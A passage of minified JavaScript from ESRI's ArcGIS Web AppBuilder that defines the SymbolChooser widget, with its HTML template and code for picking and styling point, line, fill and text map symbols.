// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/SymbolChooser.html":'\x3cdiv style\x3d"width:320px;"\x3e\r\n\t\x3cdiv class\x3d"symbol-section point-symbol-section" data-dojo-attach-point\x3d"pointSection"\x3e\r\n\t\t\x3ctable class\x3d"symbol-set-table" cellspacing\x3d"0"\x3e\r\n\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"130px"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.preview}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"pointSymPreview" style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr class\x3d"point-sym-class-select-tr"\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2"\x3e\r\n\t\t\t\t\t\t\x3cselect class\x3d"restrict-select-width" data-dojo-attach-point\x3d"pointSymClassSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'0\' selected\x3d"selected"\x3e${nls.basic}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'1\'\x3eA-Z\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'2\'\x3e${nls.arrows}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'3\'\x3e${nls.business}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'4\'\x3e${nls.cartographic}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'11\'\x3e${nls.damage}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'12\'\x3e${nls.disasters}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'13\'\x3e${nls.emergencyManagement}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'14\'\x3e${nls.generalInfrastructure}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'15\'\x3e${nls.localGovernment}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'5\'\x3e${nls.nationalParkService}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'16\'\x3e${nls.numbers}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'6\'\x3e${nls.outdoorRecreation}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'7\'\x3e${nls.peoplePlaces}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'17\'\x3e${nls.pointsOfInterest}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'8\'\x3e${nls.safetyHealth}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'18\'\x3e${nls.stateGovernment}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'9\'\x3e${nls.shapes}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d\'10\'\x3e${nls.transportation}\x3c/option\x3e\r\n\t\t\t\t\t\t\t \x3coption value\x3d"custom"\x3e${nls.customImage}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"pointCustomImageTr"\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2" data-dojo-attach-point\x3d"customImageTd" class\x3d"custom-image-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"image-file-tip jimu-ellipsis jimu-leading-margin1" data-dojo-attach-point\x3d"imageNameNode"\x3e${nls.noFileChoosen}\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr class\x3d"point-icon-tables-tr" data-dojo-attach-point\x3d"pointIconTablesTr"\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"icon-tables" data-dojo-attach-point\x3d"pointIconTables"\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.symbolSize}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"pointSize" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"width:100%;" data-dojo-props\x3d\'value:18,smallDelta:1,largeDelta:10,constraints:{min:1,max:50},intermediateChanges:true\'\x3e\x3c/input\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"pointColorTr"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.color}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"pointColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:[0,0,128,128]\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"pointOpacityTr"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.transparency}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"pointAlpha" data-dojo-type\x3d"jimu/dijit/_Transparency" data-dojo-props\x3d\'alpha:0.5\' style\x3d"width:100%;font-size:13px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"pointOutlineColorTr"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.outlineColor}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"pointOutlineColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:[0,0,128,255]\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"pointOulineWidthTr"\x3e\r\n\t\t\t\t\t\x3ctd\x3e${nls.outlineWidth}:\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"pointOutlineWidth" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"width:100%;" data-dojo-props\x3d\'value:1,smallDelta:1,constraints:{min:0,max:5},intermediateChanges:true\'\x3e\x3c/input\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"symbol-section line-symbol-section" data-dojo-attach-point\x3d"lineSection"\x3e\r\n\t\t\x3ctable class\x3d"symbol-set-table" cellspacing\x3d"0"\x3e\r\n\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"130px"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.preview}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"lineSymPreview" style\x3d"width:100%;overflow:hidden;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"icon-tables" data-dojo-attach-point\x3d"lineIconTables"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.color}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"lineColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:"#9bbb59"\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.style}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cselect class\x3d"restrict-select-width" data-dojo-attach-point\x3d"lineStylesSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t\x3coption value\x3d"solid"\x3e${nls.solid}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\x3coption value\x3d"dash"\x3e${nls.dash}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\x3coption value\x3d"dot"\x3e${nls.dot}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\x3coption value\x3d"dashdot"\x3e${nls.dashDot}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\x3coption value\x3d"longdashdotdot"\x3e${nls.dashDotDot}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.transparency}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"lineAlpha" data-dojo-type\x3d"jimu/dijit/_Transparency" data-dojo-props\x3d\'alpha:1\' style\x3d"width:100%;font-size:13px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.width}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"lineWidth" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"width:100%;"\r\n\t\t\t\t\t\tdata-dojo-props\x3d\'value:3,smallDelta:1,constraints:{min:1,max:50},intermediateChanges:true\'\x3e\x3c/input\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"symbol-section fill-symbol-section" data-dojo-attach-point\x3d"fillSection"\x3e\r\n\t\t\x3ctable class\x3d"symbol-set-table" cellspacing\x3d"0"\x3e\r\n\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"130px"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.preview}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"fillSymPreview" style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"icon-tables" data-dojo-attach-point\x3d"fillIconTables"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.color}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"fillColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:"#9bbb59"\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.transparency}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"fillAlpha" data-dojo-type\x3d"jimu/dijit/_Transparency" data-dojo-props\x3d\'alpha:0.5\' style\x3d"width:100%;font-size:13px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.outlineColor}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"fillOutlineColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:"#738c3d"\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.outlineWidth}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"fillOutlineWidth" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"width:100%;"\r\n\t\t\t\t\t\tdata-dojo-props\x3d\'value:2,smallDelta:1,constraints:{min:0,max:50},intermediateChanges:true\'\x3e\x3c/input\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"symbol-section text-symbol-section" data-dojo-attach-point\x3d"textSection"\x3e\r\n\t\t\x3ctable class\x3d"symbol-set-table" cellspacing\x3d"0"\x3e\r\n\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"130px"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.preview}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan data-dojo-attach-point\x3d"textPreview"\x3e\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.text}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput class\x3d"text-input" data-dojo-attach-point\x3d"inputText" type\x3d"text" style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.fontColor}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"textColor" data-dojo-type\x3d"jimu/dijit/ColorPicker" style\x3d"width:100%;height:30px;" data-dojo-props\x3d\'color:"#000"\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.fontSize}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"textFontSize" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"width:100%;" data-dojo-props\x3d\'value:20,smallDelta:1,constraints:{min:1,max:100},intermediateChanges:true\'\x3e\x3c/input\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/SymbolChooser.html dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/sniff dojo/query dojo/request/xhr jimu/utils jimu/symbolUtils esri/symbols/jsonUtils esri/symbols/SimpleMarkerSymbol esri/symbols/PictureMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/symbols/TextSymbol esri/symbols/Font jimu/dijit/ImageChooser jimu/dijit/ColorPicker jimu/dijit/_Transparency dijit/form/Select dijit/form/NumberSpinner".split(" "),
function(q,r,t,u,v,w,d,c,x,e,y,g,l,z,n,m,A,B,k,p,C,D,E){return q([r,t,u,w],{templateString:v,baseClass:"jimu-symbol-chooser",declaredClass:"jimu.dijit.SymbolChooser",nls:null,_pointEventsBinded:!1,_lineEventBinded:!1,_fillEventBinded:!1,_textEventBinded:!1,_invokeSymbolChangeEvent:!0,_customPictureMarkerSymbol:null,symbol:null,type:null,postMixInProperties:function(){this.nls=window.jimuNls.symbolChooser;this._setTemplateNls()},postCreate:function(){this.inherited(arguments);this._initImageChooser();
this.own(e(document.body,"click",d.hitch(this,this._onBodyClicked)));(this._isIE8=8===y("ie"))&&c.addClass(this.domNode,"ie8");this.symbol?this.showBySymbol(this.symbol):this.type&&this.showByType(this.type)},reset:function(){this.symbol=this.type=null;this._hideAllSections()},showBySymbol:function(a){this.reset();var b=a&&a.declaredClass;b&&"string"===typeof b&&0<=b.indexOf("esri.symbol")&&(this.symbol=this._cloneSymbol(a),this.isSimpleMarkerSymbol(this.symbol)||this.isPictureMarkerSymbol(this.symbol)?
(this.type="marker",this._initPointSection()):this.isSimpleLineSymbol(this.symbol)?(this.type="line",this._initLineSection()):this._isSimpleFillSymbol(this.symbol)?(this.type="fill",this._initFillSection()):this._isTextSymbol(this.symbol)&&(this.type="text",this._initTextSection()))},showByType:function(a){this.reset();if("marker"===a||"line"===a||"fill"===a||"text"===a)this.type=a,"marker"===this.type?this._initPointSection():"line"===this.type?this._initLineSection():"fill"===this.type?this._initFillSection():
"text"===this.type&&this._initTextSection()},getSymbol:function(){return this._getSymbol(!1)},getValidSymbol:function(){return this._getSymbol(!0)},_getSymbol:function(a){var b=null;"marker"===this.type?b=this._getPointSymbolBySetting(a):"line"===this.type?b=this._getLineSymbolBySetting(a):"fill"===this.type?b=this._getFillSymbolBySetting(a):"text"===this.type&&(b=this._getTextSymbolBySetting(a));a=null;b&&(a=this._cloneSymbol(b));return a},hideColorPicker:function(){for(var a="pointColor pointOutlineColor lineColor fillColor fillOutlineColor textColor".split(" "),
b=0,c=a.length;b<c;b++){var d=a[b];this[d]&&this[d].hideTooltipDialog()}},_onBodyClicked:function(a){a=a.target||a.srcElement;this._tryHideDropDownOfSelectDijit(a,this.pointSymClassSelect);this._tryHideDropDownOfSelectDijit(a,this.lineStylesSelect)},_tryHideDropDownOfSelectDijit:function(a,b){var f=b.domNode,d=b.dropDown.domNode,f=a===f||c.isDescendant(a,f);a=a===d||c.isDescendant(a,d);if(!f&&!a)b.dropDown.onCancel()},_onChange:function(a){a=this._cloneSymbol(a);this.emit("change",a)},_hideAllSections:function(){g(".symbol-section",
this.domNode).style("display","none")},_showSection:function(a){this._hideAllSections();g("."+a+"-symbol-section",this.domNode).style("display","block")},_getAncestor:function(a,b,c){return z.getAncestorDom(a,b,c)},_getAbsoluteUrl:function(a){return window.location.protocol+"//"+window.location.host+require.toUrl(a)},_cloneSymbol:function(a){if(!a)return null;var b=a;try{var c=a.toJson(),b=m.fromJson(c)}catch(h){console.error(h)}return b},_createSymbolIconTable:function(a,b,f){var e=this.type+"-icon-table";
a=c.toDom('\x3ctable class\x3d"'+("icon-table "+e+" "+(e+"-"+a))+'"\x3e\x3ctbody\x3e\x3c/tbody\x3e\x3c/table\x3e');for(var e=g("tbody",a)[0],k=Math.ceil(b.length/8),l=0;l<k;l++)c.create("tr",{},e);var n=g("tr",a);x.forEach(b,d.hitch(this,function(a,b){var e=d.clone(a),h=m.fromJson(a);b=c.create("td",{},n[Math.floor(b/8)]);c.addClass(b,"symbol-td-item");h=this._createSymbolNode(h);c.addClass(h,"symbol-div-item");var g=h.firstChild;c.addClass(g,"svg-node");if(this._isIE8&&"point"===f)if(window.isRTL){if("Cross"===
a.name||"X"===a.name)c.setStyle(g,"right","-20px"),c.setStyle(h,"marginTop","20px")}else"Cross"!==a.name&&"X"!==a.name||c.setStyle(h,"marginTop","20px");h.symbol=e;c.place(h,b)}));return a},_updatePreview:function(a){var b=this._cloneSymbol(this.symbol);c.empty(a);(b=n.createSymbolNode(b))||(b=c.create("div"));c.place(b,a)},_createSymbolNode:function(a){(a=n.createSymbolNode(a,{width:36,height:36}))||(a=c.create("div"));c.setStyle(a,{width:"36px",height:"36px"});return a},_getLineShapeDesc:function(a){var b=
null;if(this.isSimpleLineSymbol(a)||this.isCartographicLineSymbol(a))b={defaultShape:{type:"path",path:"M -90,0 L 90,0 E"},fill:null,stroke:a.getStroke()};return b},_initPointSection:function(){this._showSection("point");this._pointEventsBinded||(this._pointEventsBinded=!0,this._bindPointEvents(),this._onPointSymClassSelectChange());this.isPictureMarkerSymbol(this.symbol)?this._showBuildInPictureMarkerSymSettings():(this.isSimpleMarkerSymbol(this.symbol)||(this.symbol=new A({style:"esriSMSCircle",
color:[0,0,128,128],name:"Circle",outline:{color:[0,0,128,255],width:1},type:"esriSMS",size:18})),this._showSimpleMarkerSymSettings());this._initPointSettings(this.symbol);this._getPointSymbolBySetting()},_bindPointEvents:function(){this.own(e(this.pointIconTables,".symbol-div-item:click",d.hitch(this,this._onPointSymIconItemClick)));this.own(e(this.pointSymClassSelect,"change",d.hitch(this,this._onPointSymClassSelectChange)));this.own(e(this.pointSize,"change",d.hitch(this,this._onPointSymbolChange)));
this.own(e(this.pointColor,"change",d.hitch(this,this._onPointSymbolChange)));this.own(e(this.pointAlpha,"change",d.hitch(this,this._onPointSymbolChange)));this.own(e(this.pointOutlineColor,"change",d.hitch(this,this._onPointSymbolChange)));this.own(e(this.pointOutlineWidth,"change",d.hitch(this,this._onPointSymbolChange)))},_onPointSymbolChange:function(){this._invokeSymbolChangeEvent&&(this._getPointSymbolBySetting(),this._onChange(this.symbol))},_initPointSettings:function(a){if(a){this._invokeSymbolChangeEvent=
!1;if(this.isSimpleMarkerSymbol(a)){if(this.pointSize.set("value",a.size),this.pointColor.setColor(a.color),this.pointAlpha.setAlpha(parseFloat(a.color.a.toFixed(2))),a=a.outline)this.pointOutlineColor.setColor(a.color),this.pointOutlineWidth.set("value",parseFloat(a.width.toFixed(0)))}else this.isPictureMarkerSymbol(a)&&this.pointSize.set("value",a.width);this._invokeSymbolChangeEvent=!0}},isSimpleMarkerSymbol:function(a){return a&&"esri.symbol.SimpleMarkerSymbol"===a.declaredClass},isPictureMarkerSymbol:function(a){return a&&
"esri.symbol.PictureMarkerSymbol"===a.declaredClass},_isCustomImageOptionSelected:function(){return"custom"===this.pointSymClassSelect.get("value")},_onPointSymClassSelectChange:function(){if(this._isCustomImageOptionSelected())this._showCustomPictureMarkerSymSettings(),this._customPictureMarkerSymbol&&(this.symbol=this._customPictureMarkerSymbol,this._onPointSymbolChange());else{this._showSimpleMarkerSymSettings();this._showSelectedPointSymIconTable();var a=this.pointSymClassSelect.get("value");
this.pointSymClassSelect["def"+a]||this._requestPointSymJson(a);a=this.pointSymClassSelect.getOptions(a);this.pointSymClassSelect.domNode.title=a?a.label:""}},_hideAllPointSymIconTable:function(){g(".marker-icon-table",this.pointIconTables).style("display","none")},_showSelectedPointSymIconTable:function(){this._hideAllPointSymIconTable();var a=this.pointSymClassSelect.get("value"),a=g(".marker-icon-table-"+a,this.pointIconTables);0<a.length&&a.style("display","table")},_requestPointSymJson:function(a){var b=
"def"+a,f=this.pointSymClassSelect[b];f||(f=this._getAbsoluteUrl("jimu/dijit/SymbolsInfo/"+a+".json"),f=l(f,{handleAs:"json"}),this.pointSymClassSelect[b]=f,f.then(d.hitch(this,function(b){this.domNode&&(b=this._createSymbolIconTable(a,b,"point"),c.place(b,this.pointIconTables),this._showSelectedPointSymIconTable())}),d.hitch(this,function(a){console.error("get point symbol failed",a)})))},_onPointSymIconItemClick:function(a){if(a=this._getAncestor(a.target||a.srcElement,function(a){return c.hasClass(a,
"symbol-div-item")},5))if(g(".selected-symbol-div-item",a.parentNode.parentNode.parentNode).removeClass("selected-symbol-div-item"),c.addClass(a,"selected-symbol-div-item"),a=a.symbol){this.symbol=m.fromJson(a);a=c.getStyle(this.pointColorTr,"display");this.isSimpleMarkerSymbol(this.symbol)?this._showSimpleMarkerSymSettings():this._showBuildInPictureMarkerSymSettings();this._onPointSymbolChange();var b=c.getStyle(this.pointColorTr,"display");a!==b&&this.emit("resize")}},_showSimpleMarkerSymSettings:function(){c.addClass(this.pointCustomImageTr,
"hidden");c.removeClass(this.pointIconTablesTr,"hidden");c.removeClass(this.pointColorTr,"hidden");c.removeClass(this.pointOpacityTr,"hidden");c.removeClass(this.pointOutlineColorTr,"hidden");c.removeClass(this.pointOulineWidthTr,"hidden")},_showBuildInPictureMarkerSymSettings:function(){c.addClass(this.pointCustomImageTr,"hidden");c.removeClass(this.pointIconTablesTr,"hidden");c.addClass(this.pointColorTr,"hidden");c.addClass(this.pointOpacityTr,"hidden");c.addClass(this.pointOutlineColorTr,"hidden");
